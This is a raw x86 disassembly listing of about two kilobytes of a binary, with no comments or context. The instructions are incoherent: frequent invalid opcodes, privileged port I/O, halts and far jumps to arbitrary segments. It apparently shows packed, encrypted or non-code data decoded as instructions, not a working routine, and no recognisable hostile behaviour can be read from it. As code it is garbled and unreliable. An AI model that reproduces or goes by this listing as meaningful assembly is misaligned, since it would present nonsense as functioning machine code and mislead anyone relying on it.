  422571:	pop    ecx
  422572:	cmc    
  422573:	sub    DWORD PTR [ecx+ecx*1-0x2227e3d5],ebx
  42257a:	aam    0xd4
  42257c:	sub    dh,BYTE PTR [ebp-0x5a]
  42257f:	cmp    ch,bl
  422581:	arpl   WORD PTR [ebx+0x29],sp
  422584:	fld    TBYTE PTR [edx]
  422586:	cld    
  422587:	outs   dx,DWORD PTR ds:[esi]
  422588:	or     edx,DWORD PTR [edi]
  42258a:	outs   dx,DWORD PTR ds:[esi]
  42258b:	mov    fs,WORD PTR [edx-0x2]
  42258e:	sbb    al,0xd8
  422590:	xchg   edi,eax
  422591:	add    DWORD PTR ds:0x2dcdfc8a,esi
  422597:	mov    eax,DWORD PTR [edx-0x1ec3cb57]
  42259d:	out    0x77,al
  42259f:	jns    0x422526
  4225a1:	fwait
  4225a2:	push   esi
  4225a3:	imul   ebx,DWORD PTR [edx-0x4],0xbce49abf
  4225aa:	or     edx,esi
  4225ac:	adc    dh,ch
  4225ae:	pop    ebp
  4225af:	and    eax,DWORD PTR [ebx]
  4225b1:	jnp    0x4225e9
  4225b3:	je     0x42262a
  4225b5:	jmp    0x422586
  4225b7:	push   edi
  4225b8:	adc    dl,BYTE PTR [esi+edi*8-0x2ce3d8a2]
  4225bf:	mov    ebp,0xc3397c7
  4225c4:	mov    eax,ds:0xfd95d53c
  4225c9:	adc    al,0x9
  4225cb:	in     eax,0x68
  4225cd:	xor    esi,DWORD PTR [edi+edi*4-0x4d]
  4225d1:	xor    DWORD PTR [ebp+0x52],edx
  4225d4:	jmp    0x770933c6
  4225d9:	push   ebp
  4225da:	sub    bl,BYTE PTR [esi-0x25]
  4225dd:	scas   al,BYTE PTR es:[edi]
  4225de:	jmp    DWORD PTR [edi+ebx*1]
  4225e1:	jne    0x42261d
  4225e3:	sub    eax,DWORD PTR [edi]
  4225e5:	adc    DWORD PTR [ebp+0x7da9b22e],ebp
  4225eb:	cs dec di
  4225ee:	adc    DWORD PTR [eax-0x19],eax
  4225f1:	in     eax,dx
  4225f2:	xor    al,0x7f
  4225f4:	or     ebp,DWORD PTR [ecx]
  4225f6:	ret    0xcf7d
  4225f9:	out    dx,eax
  4225fa:	pop    ebp
  4225fb:	pop    edx
  4225fc:	jecxz  0x4225e6
  4225fe:	pusha  
  4225ff:	lods   al,BYTE PTR ds:[esi]
  422600:	mov    ah,0x1f
  422602:	pop    ss
  422603:	pop    ebx
  422604:	cmp    ebp,esi
  422606:	popa   
  422607:	rcl    DWORD PTR [ecx-0x35ec8479],0x2c
  42260e:	dec    esi
  42260f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422610:	ss xchg esi,eax
  422612:	aad    0xb7
  422614:	in     eax,dx
  422615:	retf   
  422616:	jg     0x4225b1
  422618:	jle    0x422674
  42261a:	or     al,0xad
  42261c:	add    ch,BYTE PTR [ebx+0x6e]
  42261f:	mov    eax,0x632b1e9b
  422624:	pop    es
  422625:	pusha  
  422626:	arpl   WORD PTR [esi],cx
  422628:	sbb    esi,ebp
  42262a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42262b:	cmp    eax,0xc4ba66be
  422630:	xor    DWORD PTR ds:0x92195e61,0xad890262
  42263a:	hlt    
  42263b:	rcr    BYTE PTR [edx+0x7cada46f],1
  422641:	iret   
  422642:	jmp    0xaddf:0xe796c8eb
  422649:	test   eax,0xf59af454
  42264e:	cli    
  42264f:	xchg   BYTE PTR ss:[esi+ebp*2],dh
  422653:	sbb    BYTE PTR [ecx-0x8],dl
  422656:	jnp    0x4226ab
  422658:	inc    esi
  422659:	imul   eax,DWORD PTR [edx+0xac572e8],0x94a5a9a5
  422663:	lea    ebx,[ebx-0x19]
  422666:	fadd   DWORD PTR [ebx+0x4]
  422669:	pop    edx
  42266a:	add    eax,0xd3c36dc9
  42266f:	sti    
  422670:	call   0x9f3661de
  422675:	add    ecx,DWORD PTR [edx-0x4f]
  422678:	xchg   ebp,eax
  422679:	cmovs  ebp,DWORD PTR [eax]
  42267c:	dec    edi
  42267d:	pop    edi
  42267e:	repz mov ds:0x8bea5630,eax
  422684:	call   0x20bb:0x6bd31cb2
  42268b:	or     eax,0xa2b068f
  422690:	out    dx,al
  422691:	aam    0x86
  422693:	push   ecx
  422694:	loopne 0x42270a
  422696:	mov    al,0xb4
  422698:	pop    ds
  422699:	pop    es
  42269a:	ret    
  42269b:	loopne 0x422687
  42269d:	je     0x4226e8
  42269f:	enter  0xe121,0xc1
  4226a3:	dec    ebp
  4226a4:	push   ss
  4226a5:	jmp    0x3791:0x9b336ddf
  4226ac:	out    dx,eax
  4226ad:	outs   dx,BYTE PTR ds:[esi]
  4226ae:	mov    ah,0x4c
  4226b0:	pusha  
  4226b1:	into   
  4226b2:	imul   esi,DWORD PTR [eax+edi*2-0x4e],0xc9d20fdc
  4226ba:	push   0x73cde84b
  4226bf:	dec    ecx
  4226c0:	ja     0x4226b8
  4226c2:	shr    DWORD PTR [ecx],1
  4226c4:	call   0x5c8a:0x6eeb17e9
  4226cb:	loop   0x422661
  4226cd:	gs add al,0xba
  4226d0:	lea    ecx,[eax-0x27]
  4226d3:	rcl    dh,0x7d
  4226d6:	xor    eax,0x7dc1f809
  4226db:	push   ss
  4226dc:	lods   al,BYTE PTR ds:[esi]
  4226dd:	jo     0x422744
  4226df:	push   esp
  4226e0:	lock cmp esp,DWORD PTR [ebp-0x46]
  4226e4:	inc    edx
  4226e5:	pop    edx
  4226e6:	lods   al,BYTE PTR ds:[esi]
  4226e7:	jg     0x4226fb
  4226e9:	(bad)
  4226ed:	call   0x4880a4b4
  4226f2:	shr    DWORD PTR [esi],cl
  4226f4:	es jae 0x422752
  4226f7:	xor    DWORD PTR [esi+0xe],edi
  4226fa:	arpl   WORD PTR [ebx],bp
  4226fc:	mov    ds:0xeaf16e83,eax
  422701:	push   0x8e8ce594
  422706:	or     BYTE PTR [ecx],ah
  422708:	sub    BYTE PTR [edx+0x5920a46c],0x24
  42270f:	repz jb 0x422742
  422712:	push   0x3d144e5e
  422717:	test   BYTE PTR [edx-0x3e],bh
  42271a:	jmp    0x2965ec2a
  42271f:	sub    DWORD PTR [edx-0x2f89408d],edi
  422725:	(bad)  
  422726:	lock add BYTE PTR [edi+0x9546d37],ch
  42272d:	lahf   
  42272e:	out    0xda,eax
  422730:	xchg   esi,eax
  422731:	xchg   edi,eax
  422732:	out    0x64,al
  422734:	or     BYTE PTR [ecx-0x19],cl
  422737:	sbb    al,0xd8
  422739:	outs   dx,BYTE PTR ds:[esi]
  42273a:	mov    esp,ebp
  42273c:	ret    
  42273d:	adc    ch,BYTE PTR [edi+0x4b]
  422740:	leave  
  422741:	rol    DWORD PTR [eax-0x19ea24b0],cl
  422747:	lods   al,BYTE PTR ds:[esi]
  422748:	loop   0x422785
  42274a:	xchg   edx,eax
  42274b:	xchg   esi,eax
  42274c:	shr    BYTE PTR [esi],1
  42274e:	das    
  42274f:	or     edx,DWORD PTR [ecx]
  422751:	and    eax,0xf4dbd02d
  422756:	pop    eax
  422757:	pop    ss
  422758:	aaa    
  422759:	shl    DWORD PTR gs:[edx],1
  42275c:	scas   al,BYTE PTR es:[edi]
  42275d:	rcr    ecx,1
  42275f:	mov    ebx,0xba5ea5a5
  422764:	sub    al,0x2d
  422766:	inc    ecx
  422767:	lock and ah,BYTE PTR [esi]
  42276a:	sub    dh,BYTE PTR [ecx+ecx*1]
  42276d:	mov    ebx,0xcc56bd02
  422772:	fiadd  DWORD PTR [eax-0x1b]
  422775:	xlat   BYTE PTR ds:[ebx]
  422776:	push   esi
  422777:	stos   BYTE PTR es:[edi],al
  422778:	sti    
  422779:	xor    DWORD PTR [ebx+0x55],esi
  42277c:	add    al,0x62
  42277e:	icebp  
  42277f:	add    BYTE PTR [ebx-0x53badc3e],bh
  422785:	and    al,BYTE PTR [edi-0x193043b8]
  42278b:	imul   edi,DWORD PTR [eax],0x5bb5e380
  422791:	in     eax,0x40
  422793:	ret    0xeb45
  422796:	imul   eax,ecx,0xffffffc0
  422799:	lods   al,BYTE PTR ds:[esi]
  42279a:	scas   al,BYTE PTR es:[edi]
  42279b:	jo     0x422802
  42279d:	pushf  
  42279e:	ret    0xf6af
  4227a1:	lods   eax,DWORD PTR ds:[esi]
  4227a2:	clc    
  4227a3:	jmp    0x422755
  4227a5:	xchg   ebp,eax
  4227a6:	neg    DWORD PTR [eax-0x3fbf24a0]
  4227ac:	in     al,0x58
  4227ae:	mov    DWORD PTR [ebp-0x23],ebp
  4227b1:	call   0x25bb6aa6
  4227b6:	pop    esp
  4227b7:	adc    al,0x54
  4227b9:	test   al,0x92
  4227bb:	jns    0x42276f
  4227bd:	pop    ebp
  4227be:	mov    ds:0x3e65b3ba,eax
  4227c3:	test   DWORD PTR [ecx-0x27],0x2f146aa6
  4227ca:	ret    
  4227cb:	das    
  4227cc:	adc    edi,ecx
  4227ce:	in     eax,0x35
  4227d0:	pushf  
  4227d1:	(bad)  
  4227d2:	int    0xc5
  4227d4:	sub    al,0x1
  4227d6:	jbe    0x4227c6
  4227d8:	sub    ecx,DWORD PTR [edi+0x2b3c5e73]
  4227de:	jb     0x42280b
  4227e0:	(bad)  
  4227e1:	arpl   WORD PTR [eax],bx
  4227e3:	xchg   edi,eax
  4227e4:	jge    0x4227c4
  4227e6:	pop    ebp
  4227e7:	loopne 0x42281e
  4227e9:	mov    esp,0x5285c2d1
  4227ee:	xlat   BYTE PTR ds:[ebx]
  4227ef:	or     eax,0xc03587b9
  4227f4:	cli    
  4227f5:	push   ds
  4227f6:	(bad)  
  4227f7:	mov    ds:0xfc7a02b5,al
  4227fc:	inc    edx
  4227fd:	xor    al,0xf0
  4227ff:	test   BYTE PTR fs:[eax-0x71],bh
  422803:	pop    edi
  422804:	push   esp
  422805:	xchg   ebp,eax
  422806:	inc    edi
  422807:	push   0x24479f0e
  42280c:	sbb    ebp,DWORD PTR [esi-0x6dd17f8a]
  422812:	aaa    
  422813:	aad    0x3a
  422815:	sti    
  422816:	xchg   edx,eax
  422817:	test   al,0x56
  422819:	mov    ds:0xb5299a70,al
  42281e:	jnp    0x422812
  422820:	inc    edx
  422821:	xor    al,BYTE PTR [ecx+0x52]
  422824:	xchg   edx,eax
  422825:	cmp    dl,dh
  422827:	int3   
  422828:	xor    BYTE PTR [esi+0x78],dl
  42282b:	lock repnz dec ebx
  42282e:	pusha  
  42282f:	push   0xfb20e2a
  422834:	bound  esp,QWORD PTR [eax-0xf7bb77a]
  42283a:	pop    ds
  42283b:	or     BYTE PTR [esi],ch
  42283d:	mov    gs,WORD PTR [esp+ecx*1]
  422840:	add    al,BYTE PTR [ebx+0x22]
  422843:	pop    ecx
  422844:	aam    0x69
  422846:	rcl    ch,cl
  422848:	sub    DWORD PTR [ebx-0x62],0x4a09e280
  42284f:	call   0xb655:0x976e88cc
  422856:	dec    ecx
  422857:	arpl   di,di
  422859:	xor    eax,0xc65ac1ba
  42285e:	push   cs
  42285f:	mul    BYTE PTR [esi+0x27ac9a5a]
  422865:	int    0xfc
  422867:	inc    ebp
  422868:	retf   
  422869:	out    dx,al
  42286a:	hlt    
  42286b:	lds    edi,FWORD PTR [ecx]
  42286d:	jmp    0xc1f7:0x74a4d326
  422874:	ror    BYTE PTR [edx-0x1fb4bdbe],1
  42287a:	test   al,0xd6
  42287c:	imul   edx,DWORD PTR ds:0x385c0a33,0x24
  422883:	pop    eax
  422884:	shr    ecx,cl
  422886:	mov    eax,DWORD PTR [ebp-0x66]
  422889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42288a:	(bad)  
  42288b:	rol    DWORD PTR [ecx+0xc],cl
  42288e:	sub    ch,BYTE PTR [esi-0x27]
  422891:	jae    0x42287f
  422893:	mov    dh,0x31
  422895:	inc    ebp
  422896:	rcr    DWORD PTR [bp+si+0x47],0x0
  42289b:	call   0x4301:0x1c2bf141
  4228a2:	dec    edx
  4228a3:	outs   dx,DWORD PTR ds:[esi]
  4228a4:	cmp    eax,0x981c4e8d
  4228a9:	popa   
  4228aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228ab:	xor    eax,0xf8fa844b
  4228b0:	imul   ebx,DWORD PTR [edx],0x64af463c
  4228b6:	jne    0x422846
  4228b8:	pop    ss
  4228b9:	fldcw  WORD PTR cs:[eax-0x1]
  4228bd:	jle    0x422906
  4228bf:	loopne 0x4228f3
  4228c1:	nop
  4228c2:	cmp    esi,DWORD PTR [edx]
  4228c4:	clc    
  4228c5:	ins    DWORD PTR es:[di],dx
  4228c7:	mov    edx,0xa295eeb3
  4228cc:	mov    ebx,DWORD PTR [ebx-0x7c]
  4228cf:	pop    ebp
  4228d0:	daa    
  4228d1:	inc    edi
  4228d2:	mov    ch,0xa6
  4228d4:	lds    edx,FWORD PTR [edx-0x3933cc63]
  4228da:	inc    esp
  4228db:	out    dx,eax
  4228dc:	ja     0x422893
  4228de:	cwde   
  4228df:	nop
  4228e0:	sbb    ebx,DWORD PTR [ebp+0x53a55466]
  4228e6:	cmc    
  4228e7:	imul   eax,DWORD PTR ds:0x85c20d4f,0x7429f5e3
  4228f1:	pop    esi
  4228f2:	sbb    ebx,esi
  4228f4:	and    cl,ah
  4228f6:	adc    edx,DWORD PTR ds:0xf29b609f
  4228fc:	lea    esi,[ecx]
  4228fe:	mov    ?,WORD PTR [ebx-0x4944a8a9]
  422904:	sbb    ebx,0x20
  422907:	scas   eax,DWORD PTR es:[edi]
  422908:	fisttp QWORD PTR [eax+0x5fabe48d]
  42290e:	add    edx,DWORD PTR [ecx]
  422910:	or     BYTE PTR [ebx-0x4e],al
  422913:	mov    bh,0xcb
  422915:	shl    DWORD PTR [eax-0x13aa7619],1
  42291b:	add    al,0x91
  42291d:	mov    eax,ds:0x56c856cb
  422922:	fnstenv [eax-0x5f518623]
  422928:	addr16 pop es
  42292a:	xchg   esi,eax
  42292b:	xor    eax,edi
  42292d:	(bad)  
  42292e:	sti    
  42292f:	sub    eax,DWORD PTR [edi-0x71]
  422932:	neg    DWORD PTR [edi-0x3eacb9bf]
  422938:	pop    es
  422939:	fidiv  WORD PTR [esi-0xe26d76f]
  42293f:	xor    eax,0x71cb
  422944:	add    BYTE PTR [eax],al
  422946:	add    BYTE PTR [eax],al
  422948:	add    BYTE PTR [eax],al
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	imul   ecx
  422958:	stos   BYTE PTR es:[edi],al
  422959:	push   ds
  42295a:	shl    BYTE PTR [edi+0x6800001],1
  422960:	add    BYTE PTR [eax],al
  422962:	add    DWORD PTR [esi],ebx
  422964:	mov    ?,WORD PTR [ebp+0x349d1115]
  42296a:	mov    esp,DWORD PTR [edx+0x55c0ff31]
  422970:	mov    al,BYTE PTR [ecx+0x71]
  422973:	loope  0x422964
  422975:	dec    ebp
  422976:	imul   BYTE PTR [ecx+ebp*1-0x5ac38910]
  42297d:	sbb    eax,0x33f64830
  422982:	call   0x726666a7
  422987:	jmp    0x974c:0x5c54518d
  42298e:	or     DWORD PTR [esi+eax*1-0x48],ecx
  422992:	int    0x70
  422994:	cli    
  422995:	retf   0x8c6c
  422998:	pop    ecx
  422999:	sub    BYTE PTR [ecx+0x6c1d2879],dl
  42299f:	xchg   edi,eax
  4229a0:	clts   
  4229a2:	pop    edx
  4229a3:	jg     0x4229a8
  4229a5:	mov    ch,0xd2
  4229a7:	ror    DWORD PTR [eax],1
  4229a9:	pop    ebp
  4229aa:	dec    ebx
  4229ab:	ret    
  4229ac:	pop    ss
  4229ad:	int3   
  4229ae:	mov    ebx,0xcce7362f
  4229b3:	add    edi,0x25dfa62f
  4229b9:	or     ch,BYTE PTR [edi+0x68]
  4229bc:	call   0x551c8929
  4229c1:	les    esp,FWORD PTR [esi]
  4229c3:	clc    
  4229c4:	(bad)  [eax+0x7c]
  4229c7:	mov    ch,0xba
  4229c9:	das    
  4229ca:	jmp    0x1dae:0x8190d049
  4229d1:	(bad)
  4229d7:	inc    ebp
  4229d8:	push   ecx
  4229d9:	inc    ecx
  4229da:	mov    esi,0x317c26dc
  4229df:	pop    eax
  4229e0:	xchg   BYTE PTR [edx],al
  4229e2:	int3   
  4229e3:	jg     0x4229e9
  4229e5:	clc    
  4229e6:	sar    DWORD PTR es:[edx-0x66],cl
  4229ea:	(bad)  
  4229eb:	rcr    eax,cl
  4229ed:	xor    ebx,DWORD PTR [esi+0x27ea416]
  4229f3:	out    0x40,eax
  4229f5:	jae    0x422a67
  4229f7:	push   ebx
  4229f8:	loope  0x422a54
  4229fa:	(bad)  
  4229fc:	push   es
  4229fd:	test   DWORD PTR [ecx],0xb21a68eb
  422a03:	call   0x9fcb:0x6755d859
  422a0a:	inc    esi
  422a0b:	test   eax,0x4f84ffe6
  422a10:	test   al,0x39
  422a12:	repnz pop edi
  422a14:	and    eax,0x5fa9c27a
  422a19:	jge    0x4229ce
  422a1b:	adc    eax,DWORD PTR [ecx+0x4d693183]
  422a21:	shl    bl,cl
  422a23:	and    ebx,esp
  422a25:	xor    eax,0xa9ba2adf
  422a2a:	lods   eax,DWORD PTR ds:[esi]
  422a2b:	jge    0x422a38
  422a2d:	stc    
  422a2e:	inc    ebp
  422a2f:	dec    eax
  422a30:	mov    edi,0xbe3cc220
  422a35:	out    dx,al
  422a36:	and    cl,al
  422a38:	rcr    BYTE PTR [eax-0x77dfdcba],0x2e
  422a3f:	push   edx
  422a40:	mov    eax,0x54d63e30
  422a45:	aad    0x6
  422a47:	xor    BYTE PTR [eax],al
  422a49:	stos   DWORD PTR es:[edi],eax
  422a4a:	daa    
  422a4b:	and    al,0x8e
  422a4d:	pushf  
  422a4e:	jecxz  0x4229da
  422a50:	call   0x20e2:0xccc2b1bf
  422a57:	lods   al,BYTE PTR ds:[esi]
  422a58:	fcmove st,st(5)
  422a5a:	push   cs
  422a5b:	fcomi  st,st(1)
  422a5d:	ror    BYTE PTR [ebp-0x573359e4],0x5c
  422a64:	mov    esi,0x12c3083b
  422a69:	and    ebp,DWORD PTR [edi-0x5be28d48]
  422a6f:	and    eax,0x8c994b83
  422a74:	jmp    0x422a23
  422a76:	jno    0x422a39
  422a78:	fwait
  422a79:	dec    ebx
  422a7a:	mov    edi,edi
  422a7c:	pop    es
  422a7d:	rol    DWORD PTR [ebp-0x55],0xfe
  422a81:	test   al,0x88
  422a83:	es cmp al,0xd4
  422a86:	inc    edx
  422a87:	push   ebx
  422a88:	xor    eax,DWORD PTR ds:0xa246dcb3
  422a8e:	inc    esi
  422a8f:	pop    esp
  422a90:	sti    
  422a91:	xlat   BYTE PTR ds:[ebx]
  422a92:	les    esi,FWORD PTR [esi+0x11]
  422a95:	adc    ah,ah
  422a97:	lea    ebp,[edi+0x45]
  422a9a:	jno    0x422a8e
  422a9c:	scas   al,BYTE PTR es:[edi]
  422a9d:	xchg   ebp,eax
  422a9e:	adc    DWORD PTR [edx+ebp*8],ebp
  422aa1:	pusha  
  422aa2:	and    eax,0x523b0998
  422aa7:	xchg   esi,eax
  422aa8:	fcomp  DWORD PTR [edx-0x2d]
  422aab:	sub    ebx,DWORD PTR [ebx-0x6a81dbee]
  422ab1:	in     eax,dx
  422ab2:	adc    BYTE PTR [ebx],ah
  422ab4:	imul   DWORD PTR [edx]
  422ab6:	aad    0x4b
  422ab8:	(bad)  
  422ab9:	or     BYTE PTR [ebp-0x10],dl
  422abc:	jl     0x422ab1
  422abe:	push   eax
  422abf:	mov    bh,0x6
  422ac1:	jo     0x422a50
  422ac3:	cmp    eax,0xcb9ff38
  422ac8:	cld    
  422ac9:	js     0x422adc
  422acb:	mul    BYTE PTR cs:[ebp+0x5d]
  422acf:	mov    ebx,0xb7671074
  422ad4:	daa    
  422ad5:	push   ebx
  422ad6:	bound  edi,QWORD PTR [edi-0x1b]
  422ad9:	outs   dx,BYTE PTR ds:[esi]
  422ada:	ror    DWORD PTR ds:0x4dc7cfb9,cl
  422ae0:	sbb    ch,dh
  422ae2:	cmp    DWORD PTR [ecx-0x59],edx
  422ae5:	xor    BYTE PTR [esi+0x3d1376a9],bl
  422aeb:	jmp    0x19e:0x6052bada
  422af2:	sub    BYTE PTR [ecx+0xe],ch
  422af5:	dec    esi
  422af6:	daa    
  422af7:	cmp    al,0x2b
  422af9:	xor    eax,0xc0f8cad1
  422afe:	pusha  
  422aff:	xor    BYTE PTR [esi],ch
  422b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b02:	mov    edi,0xee839b0b
  422b07:	inc    ebx
  422b08:	xor    al,0x39
  422b0a:	cmp    DWORD PTR [ebp-0x34],edx
  422b0d:	mov    ebx,0x143c4329
  422b12:	add    al,0x81
  422b14:	mov    edx,esp
  422b16:	scas   eax,DWORD PTR es:[edi]
  422b17:	adc    al,0x5d
  422b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b1a:	sar    DWORD PTR [esi+0x5126ae83],1
  422b20:	mov    cl,0xa4
  422b22:	dec    esp
  422b23:	xchg   esp,eax
  422b24:	and    al,0xa3
  422b26:	and    ah,BYTE PTR ds:0x4f16c088
  422b2c:	mov    eax,0x195f3db9
  422b31:	dec    esp
  422b32:	sub    al,BYTE PTR [eax+0x4]
  422b35:	cmp    eax,0x7bf554e7
  422b3a:	pop    ds
  422b3b:	pop    esp
  422b3c:	stc    
  422b3d:	adc    DWORD PTR [edx+0x444d801a],edi
  422b43:	push   cs
  422b44:	pop    esi
  422b45:	jge    0x422b3e
  422b47:	ins    DWORD PTR es:[edi],dx
  422b48:	jge    0x422ada
  422b4a:	iret   
  422b4b:	mul    BYTE PTR [edx+0x32]
  422b4e:	sbb    ebx,DWORD PTR [ebp-0x5a]
  422b51:	add    cl,BYTE PTR [esi-0x32]
  422b54:	dec    ebp
  422b55:	adc    al,BYTE PTR [esi+esi*2+0x5d]
  422b59:	sbb    BYTE PTR [ebx],al
  422b5b:	jmp    0x4444:0x391223fc
  422b62:	mov    al,ds:0xf502a64d
  422b67:	loopne 0x422aed
  422b69:	cmc    
  422b6a:	xchg   ebp,eax
  422b6b:	pop    esi
  422b6c:	push   ebx
  422b6d:	in     al,0xe5
  422b6f:	inc    ebp
  422b70:	dec    eax
  422b71:	lahf   
  422b72:	loope  0x422bcf
  422b74:	mov    ds:0x2e8a6a7b,eax
  422b79:	xchg   esi,eax
  422b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b7b:	(bad)  
  422b7c:	(bad)  
  422b7e:	add    ch,BYTE PTR [ebp-0x2a1cc502]
  422b84:	shl    esp,1
  422b86:	mov    edi,DWORD PTR ds:0xbf487c43
  422b8c:	cmp    ecx,DWORD PTR [edx+0x38]
  422b8f:	push   0x7a
  422b91:	jno    0x422b14
  422b93:	pop    eax
  422b94:	sbb    esi,DWORD PTR [ebx]
  422b96:	and    ah,bl
  422b98:	mov    ds:0x9fa1a01a,eax
  422b9d:	dec    esp
  422b9e:	inc    eax
  422b9f:	sub    DWORD PTR [esi+0x45bee1d],0x8faa3fa5
  422ba9:	dec    ebp
  422baa:	clc    
  422bab:	icebp  
  422bac:	(bad)  
  422bad:	sti    
  422bae:	sbb    bl,BYTE PTR [ebx]
  422bb0:	mov    al,0xca
  422bb2:	addr16 sbb eax,0x8b0eb104
  422bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bb9:	leave  
  422bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bbb:	add    al,0x33
  422bbd:	xchg   edx,eax
  422bbe:	pusha  
  422bbf:	dec    edx
  422bc0:	push   ecx
  422bc1:	jge    0x422c17
  422bc3:	icebp  
  422bc4:	(bad)  
  422bc5:	lds    esi,FWORD PTR [edi+0x4b5167ba]
  422bcb:	xchg   esp,eax
  422bcc:	clc    
  422bcd:	adc    al,0x21
  422bcf:	jp     0x422b77
  422bd1:	inc    ebp
  422bd2:	push   ecx
  422bd3:	pop    esp
  422bd4:	pop    ecx
  422bd5:	adc    eax,0xfb505e68
  422bda:	outs   dx,BYTE PTR ds:[esi]
  422bdb:	addr16 aad 0x49
  422bde:	pop    es
  422bdf:	cmp    ch,BYTE PTR [ecx]
  422be1:	fild   WORD PTR [edx-0x25bacd0]
  422be7:	pop    esi
  422be8:	test   BYTE PTR [ecx+0x37],dl
  422beb:	sbb    ecx,DWORD PTR [ebx+0x8]
  422bee:	sub    BYTE PTR [eax-0x47ee683a],dl
  422bf4:	dec    ah
  422bf6:	mov    dl,0xc8
  422bf8:	out    0x6b,eax
  422bfa:	cmp    ebx,eax
  422bfc:	adc    DWORD PTR [edx+0x735b7fff],edi
  422c02:	xchg   esi,eax
  422c03:	cmp    DWORD PTR [ebx],edi
  422c05:	(bad)
  422c08:	sub    edx,esi
  422c0a:	xchg   ecx,eax
  422c0b:	mov    esi,0x4a9f5d0d
  422c10:	pop    edx
  422c11:	cmp    bh,BYTE PTR [edi]
  422c13:	mov    dl,0x9f
  422c15:	inc    ecx
  422c16:	or     ecx,DWORD PTR [edx+0x4b]
  422c19:	push   0x2d
  422c1b:	shl    BYTE PTR ds:0x70b24e46,cl
  422c21:	adc    eax,0x9f3de888
  422c26:	je     0x422bb3
  422c28:	sub    al,0x59
  422c2a:	mov    bh,0x24
  422c2c:	mov    bl,0x1e
  422c2e:	mov    esp,DWORD PTR [esi]
  422c30:	jae    0x422be2
  422c32:	(bad)  
  422c33:	popa   
  422c34:	adc    edx,edi
  422c36:	xor    bl,bl
  422c38:	inc    ebp
  422c39:	cld    
  422c3a:	retf   
  422c3b:	repz pop es
  422c3d:	mov    al,ds:0x77715e39
  422c42:	call   0x317b1410
  422c47:	cmp    dh,bh
  422c49:	mov    bl,0x6c
  422c4b:	int    0x95
  422c4d:	pop    esi
  422c4e:	jge    0x422caf
  422c50:	xchg   ebp,eax
  422c51:	hlt    
  422c52:	and    al,0x7d
  422c54:	sub    DWORD PTR [ebp-0x3ad513e6],edx
  422c5a:	sub    al,0xe
  422c5c:	sbb    al,0x48
  422c5e:	mov    ebx,0xa922fbb
  422c63:	xor    DWORD PTR [edx-0x1],0xd5fcc435
  422c6a:	cmp    bl,dh
  422c6c:	cmp    DWORD PTR es:[eax-0x7450b806],ebx
  422c73:	xor    esp,ebx
  422c75:	xor    DWORD PTR [edx],ebx
  422c77:	mov    edi,0xc3038ac
  422c7c:	cmp    ch,ah
  422c7e:	or     al,0xc9
  422c80:	sahf   
  422c81:	nop
  422c82:	jle    0x422c7d
  422c84:	xor    eax,DWORD PTR [eax]
  422c86:	mov    dl,0xce
  422c88:	sub    eax,0x1c7554cf
  422c8d:	dec    edx
  422c8e:	pop    ds
  422c8f:	xchg   BYTE PTR [eax-0x74cb791a],dl
  422c95:	add    DWORD PTR [ebx+0x20125ff9],ebx
  422c9b:	scas   eax,DWORD PTR es:[edi]
  422c9c:	sbb    cl,BYTE PTR [esi]
  422c9e:	jp     0x422c88
  422ca0:	cmp    dl,BYTE PTR [esi]
  422ca2:	scas   eax,DWORD PTR es:[edi]
  422ca3:	and    BYTE PTR [esi],dl
  422ca5:	add    DWORD PTR [ebp+0x1b4da2d2],ebx
  422cab:	push   eax
  422cac:	pop    ss
  422cad:	mov    bl,0x6f
  422caf:	test   BYTE PTR [ecx+0x16],dl
  422cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cb3:	fnstcw WORD PTR [ecx-0x10b2f91b]
  422cb9:	jo     0x422d18
  422cbb:	mov    es,edi
  422cbd:	(bad)  
  422cbe:	jp     0x422ce3
  422cc0:	mov    dl,0x74
  422cc2:	xor    al,0x5c
  422cc4:	or     DWORD PTR [ebx+0x4d],esp
  422cc7:	push   ebx
  422cc8:	xor    BYTE PTR [esp+edi*4+0x27],0x8d
  422ccd:	nop
  422cce:	add    bh,ch
  422cd0:	fldenv [ecx]
  422cd2:	and    al,0x21
  422cd4:	push   cs
  422cd5:	lods   al,BYTE PTR ds:[esi]
  422cd6:	iret   
  422cd7:	xor    DWORD PTR [esp+edx*1-0x4e],esp
  422cdb:	mov    esi,DWORD PTR [esi+0x19]
  422cde:	pop    edx
  422cdf:	mov    esp,fs
  422ce1:	cwde   
  422ce2:	jp     0x422ce0
  422ce4:	xor    cl,BYTE PTR [ecx-0x67]
  422ce7:	and    esp,DWORD PTR [edi+0x42]
  422cea:	lods   eax,DWORD PTR ds:[esi]
  422ceb:	fcmovnu st,st(0)
  422ced:	in     al,dx
  422cee:	xchg   BYTE PTR [edx+0x47],bl
  422cf1:	loopne 0x422ca5
  422cf3:	inc    edi
  422cf4:	jb     0x422d36
  422cf6:	jl     0x422c97
  422cf8:	cmp    BYTE PTR [esi+0x38827b80],dh
  422cfe:	in     eax,0xa9
  422d00:	mov    dl,0xbf
  422d02:	leave  
  422d03:	and    esi,DWORD PTR ds:0x3c910c01
  422d09:	lods   eax,DWORD PTR ds:[esi]
  422d0a:	scas   eax,DWORD PTR es:[edi]
  422d0b:	aas    
  422d0c:	cli    
  422d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d0e:	stc    
  422d0f:	or     al,0x55
  422d11:	and    BYTE PTR [ecx],cl
  422d13:	mov    ebp,0x9c750a95
  422d18:	aam    0x9f
  422d1a:	inc    esp
  422d1b:	aam    0x8e
  422d1d:	(bad)  
  422d1e:	pop    esi
  422d1f:	and    BYTE PTR es:[esi-0x23],bl
  422d23:	test   DWORD PTR [esi],edx
  422d25:	mov    ch,0x43
  422d27:	add    edx,DWORD PTR [ecx]
  422d29:	pop    ss
  422d2a:	pop    esi
